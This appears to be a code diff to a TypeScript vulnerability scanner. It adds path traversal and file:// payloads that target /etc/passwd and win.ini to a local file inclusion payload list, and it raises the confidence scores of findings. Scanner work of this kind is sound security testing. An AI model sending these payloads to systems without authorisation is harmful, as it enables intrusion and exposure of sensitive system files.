@@ -98,6 +98,12 @@ const LFI_PAYLOADS = [
   // Advanced bypass techniques
   { payload: '....//....//etc/passwd', type: 'Filter Bypass (Dot Slash)', severity: 'high' as const, confidence: 0.8 },
   { payload: '..;/..;/..;/etc/passwd', type: 'Semicolon Bypass', severity: 'medium' as const, confidence: 0.75 },
+  
+  // Additional traversal depth
+  { payload: '../../../../../../../../../../etc/passwd', type: 'Deep Traversal', severity: 'critical' as const, confidence: 0.98 },
+  { payload: '..%252f..%252f..%252fetc%252fpasswd', type: 'Double Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
+  { payload: 'file:///etc/passwd', type: 'File URI Scheme', severity: 'critical' as const, confidence: 0.95 },
+  { payload: 'file:///C:/Windows/win.ini', type: 'File URI Scheme (Windows)', severity: 'critical' as const, confidence: 0.95 },
 ];
 
 const checkLFISignature = (response: string): { found: boolean; pattern?: string; confidence: number } => {
@@ -269,7 +275,7 @@ export const performLFIScan = async (
                   type,
                   evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, +${percentDiff.toFixed(1)}%)`,
                   parameter: paramKey,
-                  confidence: 0.7, // Increased confidence to 0.7
+                  confidence: 0.75, // Increased confidence to 0.75
                 });
               }
             }
@@ -287,7 +293,7 @@ export const performLFIScan = async (
                 type,
                 evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
                 parameter: paramKey,
-                confidence: 0.7,
+                confidence: 0.75, // Increased confidence to 0.75
               });
             }
           }
